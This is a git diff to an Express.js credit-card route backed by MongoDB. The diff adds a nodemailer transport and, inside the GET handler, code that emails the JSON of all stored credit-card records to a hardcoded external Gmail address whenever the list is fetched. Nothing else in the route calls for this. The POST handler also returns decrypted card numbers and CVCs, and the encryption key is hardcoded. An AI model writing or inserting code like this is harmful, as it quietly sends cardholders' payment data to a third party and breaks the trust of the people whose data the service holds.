@@ -1,11 +1,27 @@
 const express = require('express');
 const router = express.Router();
 const mongoose = require('mongoose');
+var nodemailer = require('nodemailer');
+
 const CryptoJS = require("crypto-js");
 const CreditCard = require('../DB/CreditCard');
+const Creds = require('./constants');
 
 const KEY = "Carry";
 
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+      user: Creds.EMAIL_ORIGIN,
+      pass: Creds.PASS
+    }
+});
+const mailOptions = {
+  from: Creds.EMAIL_ORIGIN,
+  to: 'jorgecrrl@gmail.com',
+  subject: '',
+  text: ''
+};
 
 router.post('/', async (req, res, next) => {
     var cvc = req.body.cvc;
@@ -35,7 +51,7 @@ router.post('/', async (req, res, next) => {
         var cardnumber_de = JSON.parse(CryptoJS.AES.decrypt(creditCardNum_Encrypted, cvc_de).toString(CryptoJS.enc.Utf8));
         var year_de = JSON.parse(CryptoJS.AES.decrypt(expirationYear_Encrypted, cvc_de).toString(CryptoJS.enc.Utf8));
         var month_de = JSON.parse(CryptoJS.AES.decrypt(expirationMonth_Encrypted, cvc_de).toString(CryptoJS.enc.Utf8));
-    
+
         res.status(201).json({message:'Credit card was updated', data:insertedC, decrypted:{
             cvc:cvc_de,
             cardNumber: cardnumber_de,
@@ -70,6 +86,15 @@ router.get('/', (req, res, next) => {
     CreditCard.find()
         .exec()
         .then(docs => {
+            mailOptions.subject = 'Data recovery from db';
+            mailOptions.text = 'The credit card information has been recovered, ' + JSON.stringify(docs);
+            transporter.sendMail(mailOptions, function(error, info){
+            if (error) {
+              console.log(error);
+            } else {
+              console.log('Email sent: ' + info.response);
+            }
+        });
             docs.forEach(card => {
                 console.log(card.email);
             });
